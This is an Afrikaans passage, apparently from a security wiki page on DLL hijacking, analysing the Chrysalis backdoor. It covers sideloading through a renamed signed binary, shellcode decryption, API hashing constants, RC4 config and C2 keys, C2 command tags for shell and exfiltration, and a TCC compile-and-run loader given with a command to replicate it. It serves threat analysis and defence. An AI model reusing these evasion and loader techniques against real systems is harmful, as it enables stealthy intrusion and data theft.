- `update.exe` (NSIS) skep `%AppData%\Bluetooth`, merk dit **HIDDEN**, plaas 'n hernoemde Bitdefender Submission Wizard `BluetoothService.exe`, 'n kwaadwillige `log.dll`, en 'n geënkripteerde blob `BluetoothService`, en start dan die EXE.
- Die gasheer EXE importeer `log.dll` en roep `LogInit`/`LogWrite` aan. `LogInit` mmap-laai die blob; `LogWrite` dekripteer dit met 'n pasgemaakte LCG-gebaseerde stroom (konstantes **0x19660D** / **0x3C6EF35F**, sleutelmateriaal afgelei van 'n vorige hash), oorskryf die buffer met plaintext shellcode, maak tydelike hulpbronne vry, en spring daarna na dit.
- Om 'n IAT te vermy, los die loader APIs op deur export-name te hasj met **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, dan 'n Murmur-styl avalanche toe te pas (**0x85EBCA6B**) en te vergelyk met gesoute teiken-hashes.

Main shellcode (Chrysalis)
- Dekripteer 'n PE-agtige hoofmodule deur add/XOR/sub met sleutel `gQ2JR&9;` oor vyf pases te herhaal, dan dinamies `Kernel32.dll` → `GetProcAddress` te laai om die import-resolusie te voltooi.
- Herbou DLL-naamstringe tydens runtime deur per-karakter bit-rotate/XOR transformasies, en laai dan `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Gebruik 'n tweede resolver wat die **PEB → InMemoryOrderModuleList** deurloop, elke export-tabel in 4-byte blokke parseeer met Murmur-styl menging, en slegs op `GetProcAddress` val as die hash nie gevind word nie.

Embedded configuration & C2
- Konfigurasie lê binne die gedropte `BluetoothService`-lêer by **offset 0x30808** (grootte **0x980**) en is RC4-gedekodeer met sleutel `qwhvb^435h&*7`, wat die C2-URL en User-Agent openbaar maak.
- Beacons bou 'n dot-geskeide gasheerprofiel, voeg tag `4Q` voorop, en RC4-enkripteer dan met sleutel `vAuig34%^325hGV` voor `HttpSendRequestA` oor HTTPS. Antwoorde word RC4-gedekodeer en deur 'n tag-sakaar gestuur (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer gevalle).
- Uitvoeringsmodus word deur CLI-args gehek: geen args = installeer persistentie (service/Run key) wys na `-i`; `-i` herbegin self met `-k`; `-k` slaan installasie oor en hardloop die payload.

Alternate loader observed
- Dieselfde indringing het Tiny C Compiler geplaas en `svchost.exe -nostdlib -run conf.c` vanaf `C:\ProgramData\USOShared\` uitgevoer, met `libtcc.dll` langs dit. Die aanvaller-verskafde C-bron het shellcode ingebed, dit gekompileer, en in geheue uitgevoer sonder die skyf met 'n PE aan te raak. Repliceer met:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Hierdie TCC-based compile-and-run stage het `Wininet.dll` tydens runtime ingevoer en 'n second-stage shellcode vanaf 'n hardcoded URL gehaal, wat 'n flexible loader verskaf wat as 'n compiler run voorgee.

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../../banners/hacktricks-training.md}}
